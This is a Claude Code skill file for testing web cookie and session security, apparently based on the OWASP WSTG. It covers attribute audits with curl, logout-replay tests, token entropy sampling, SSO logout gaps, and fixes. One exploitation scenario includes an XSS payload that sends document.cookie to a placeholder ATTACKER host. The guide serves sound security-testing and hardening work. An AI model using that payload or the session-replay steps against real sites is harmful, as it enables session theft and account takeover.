---
name: cookie-attacks
description: >
  Audit and attack session cookies via missing Secure/HttpOnly/SameSite attributes, overly broad
  Domain/Path scope, non-expiring persistent cookies, absent __Host- and __Secure- prefixes,
  browser cache leakage (Cache-Control: no-store missing), session token predictability via Burp
  Sequencer analysis, server-side session not invalidated on logout, and SSO single-logout bypass.
  Tools: Burp Suite Repeater/Sequencer, OWASP ZAP, EditThisCookie, Tamper Data, Cookiebro.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite or OWASP ZAP.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-SESS-02, WSTG-SESS-06
---

# Cookie Security and Logout Testing

## What Is Broken and Why

Session cookies are the primary authentication artifact in web applications. Missing security
attributes expose them to theft via network interception (`Secure` absent), JavaScript injection
attacks (`HttpOnly` absent), cross-site request forgery (`SameSite` absent), and cross-subdomain
theft (`Domain` too broad). Cookies that persist beyond the session or survive logout allow
session restoration attacks. In SSO environments, application-level logout without central-portal
logout leaves the authenticated state intact across all federated applications. Predictable tokens
reduce the brute-force cost of session forgery to practical levels.

## Key Signals

- `Set-Cookie` response missing `Secure` flag on any session cookie
- `Set-Cookie` response missing `HttpOnly` flag on session cookies
- `Set-Cookie` with `SameSite=None` but application is not a cross-site embedded resource
- `SameSite` attribute absent (defaults to `Lax` in modern browsers, but `None` in older ones)
- `Domain=.TARGET` (leading dot) set too broadly — accessible to all subdomains
- `Path=/` for cookies that should scope to `/bank` or `/admin`
- Session cookie has `Expires` far in the future or is persistent (survives browser close)
- Cookie names lack `__Host-` or `__Secure-` prefixes
- Authenticated page responses missing `Cache-Control: no-store`
- After logout, old session cookie still returns 200 on authenticated endpoints (no server-side invalidation)
- Back button after logout displays cached authenticated page content
- In SSO: application logout does not invalidate central SSO session token

## Methodology

1. **Attribute audit**: Intercept all `Set-Cookie` headers across the application; check every
   session and auth cookie for `Secure`, `HttpOnly`, `SameSite`, `Domain`, `Path`, `Expires`.
2. **Cookie prefix check**: Verify whether session cookies use `__Host-` (strongest binding) or
   `__Secure-` prefixes.
3. **Scope verification**: Test if cookies with broad `Domain` attributes are accessible from
   sibling subdomains (security boundary check).
4. **Persistence test**: Close browser entirely; reopen and navigate to authenticated pages; check
   if session persists (persistent cookie vulnerability).
5. **Logout server-side invalidation**: After logout, copy the session cookie; replay it against
   authenticated endpoints in Burp Repeater; observe if 200 or redirect to login.
6. **Back-button cache**: Log out; press browser Back button; observe if authenticated page
   content is visible from cache.
7. **Session timeout**: Make an authenticated request; wait incrementally; determine inactivity
   timeout threshold.
8. **SSO logout**: Log out of application; attempt access via SSO portal without re-entering
   credentials; then log out of SSO portal; attempt application access.
9. **Token entropy**: Feed session tokens to Burp Sequencer; collect 200+ samples; analyze for
   effective entropy bits.

## Payloads & Tools

```bash
# Full cookie attribute audit on login response
curl -sI -X POST "https://TARGET/login" \
  -d "user=VICTIM&pass=PASSWORD" | grep -i "set-cookie"
# Expected: Secure; HttpOnly; SameSite=Strict; Path=/; no Domain or __Host- prefix

# Check all Set-Cookie headers site-wide (spider + header audit)
# In Burp: Scanner > Site Audit > Cookies without Secure/HttpOnly flags

# Logout invalidation test
# 1. Log in, capture session token
SESSION=$(curl -si -X POST "https://TARGET/login" \
  -d "user=VICTIM&pass=PASSWORD" | grep -i "set-cookie" | grep -oP 'SessionID=[^;]+')
echo "Session: $SESSION"
# 2. Log out
curl -s "https://TARGET/logout" -b "$SESSION" -o /dev/null
# 3. Replay old session token
curl -sI "https://TARGET/account/dashboard" -b "$SESSION" | head -1
# Should be 302 to login; if 200 = server-side session not invalidated

# Cache header verification on authenticated page
curl -sI "https://TARGET/account/profile" \
  -b "SessionID=VALID_TOKEN" | grep -iE "cache-control|pragma|expires"
# Required: Cache-Control: no-cache, no-store

# Back-button cache test (manual — browser test)
# 1. Log in to TARGET
# 2. Navigate to /account/dashboard
# 3. Log out
# 4. Press Back — if page renders from cache without server request = vulnerability

# Domain scope test — check if cookie accessible from sibling subdomain
# (Conceptual — requires DNS control of sibling subdomain)
# A cookie set as Domain=.TARGET is readable by sub.TARGET, static.TARGET, etc.

# Persistent cookie test — check Expires/Max-Age
curl -sI "https://TARGET/login" | grep -i "set-cookie" | grep -iE "expires|max-age"
# Session cookies should have no Expires/Max-Age (session-only, cleared on browser close)

# Recommended secure Set-Cookie header
# Set-Cookie: __Host-SID=<token>; path=/; Secure; HttpOnly; SameSite=Strict
```

```python
# Token entropy sampling helper
import requests, time

tokens = []
for i in range(50):
    r = requests.post("https://TARGET/login",
                      data={"user": f"testuser{i}", "pass": "PASSWORD"},
                      allow_redirects=False)
    for cookie in r.cookies:
        if "session" in cookie.name.lower() or "sid" in cookie.name.lower():
            tokens.append(cookie.value)
    time.sleep(0.05)  # 50ms window

print(f"Collected {len(tokens)} tokens")
print("Sample:", tokens[:5])
# Load remaining analysis into Burp Sequencer for entropy measurement
```

## Bypass Techniques

- `Cache-Control: private` does NOT prevent browser caching; authenticated page content may
  remain in browser cache even if `private` is set without `no-store`.
- `HttpOnly` only blocks JavaScript access; `Secure` is still needed to prevent network sniffing.
- `SameSite=Lax` still allows cookies on top-level navigations (clicking links); only `Strict`
  blocks these.
- `__Secure-` prefix requires `Secure` attribute but does not enforce `Path=/` or remove `Domain`;
  `__Host-` is more restrictive and preferred.
- ASP.NET Forms Authentication cookies that are client-validated only (without server-side session
  store) survive server-side "logout" and can be replayed.
- SSO implementations where the SP (service provider) logout only clears the local session but
  does not send a logout request to the IdP leave the central session active.

## Exploitation Scenarios

**Scenario 1 — Session Theft via Missing HttpOnly (XSS Chain)**
Setup: Session cookie lacks `HttpOnly`; application has a reflected XSS vulnerability.
Trigger: Attacker delivers XSS payload `document.location='https://ATTACKER/?c='+document.cookie`.
Impact: Session cookie exfiltrated; attacker takes over victim session without password.

**Scenario 2 — Session Restoration After Logout**
Setup: Application clears client-side cookie on logout but does not invalidate token server-side.
Trigger: Attacker with previously captured session token replays it post-logout via Burp Repeater.
Impact: Full authenticated access despite victim having logged out; persistent account access.

**Scenario 3 — SSO Incomplete Logout**
Setup: Application logout only destroys local session; central SSO session remains active.
Trigger: After logging out of the application, attacker with physical/remote access visits SSO
portal; portal auto-authenticates without credentials; application session re-established.
Impact: SSO logout ineffective; authentication state persists across applications in the federation.

## False Positives

- A session cookie without `SameSite` attribute in a modern browser defaults to `Lax`, which
  provides partial CSRF protection; absence of the explicit attribute is still a finding but
  impact depends on browser version.
- A `200` response replaying an old session token may be a public/cached page that does not
  actually reflect authenticated state; confirm by checking for user-specific data in the response.
- `Cache-Control: no-cache` means revalidate with server before using cache; it does NOT prevent
  storing — only `no-store` prevents local storage.

## Fix Patterns

- Use `__Host-SID=<token>; path=/; Secure; HttpOnly; SameSite=Strict` as the session cookie
  template.
- Invalidate session tokens server-side on logout; maintain a server-side session store or
  token revocation list.
- Set `Cache-Control: no-cache, no-store` and `Pragma: no-cache` on all authenticated responses.
- Issue non-persistent (RAM-only, no `Expires`) session cookies.
- In SSO environments, implement SP-initiated single logout (SLO) that sends logout to the IdP.
- Generate session IDs with a CSPRNG; minimum 256-bit entropy; minimum 50-character token length.
- Implement idle and absolute session timeouts appropriate to application sensitivity.

## Related Skills

[[session-fixation]] and cookie-attacks attack the same session token lifecycle from different angles — fixation plants a known token before login, while cookie attacks exploit weak attributes or post-logout persistence. A missing `HttpOnly` flag directly enables [[xss-stored]] or [[xss-reflected]] to steal cookies via `document.cookie`. A missing `SameSite` attribute expands the [[csrf]] attack surface. Broad `Domain` scope allows a [[cors-misconfig]] on a subdomain to read or set the parent domain's session cookie.
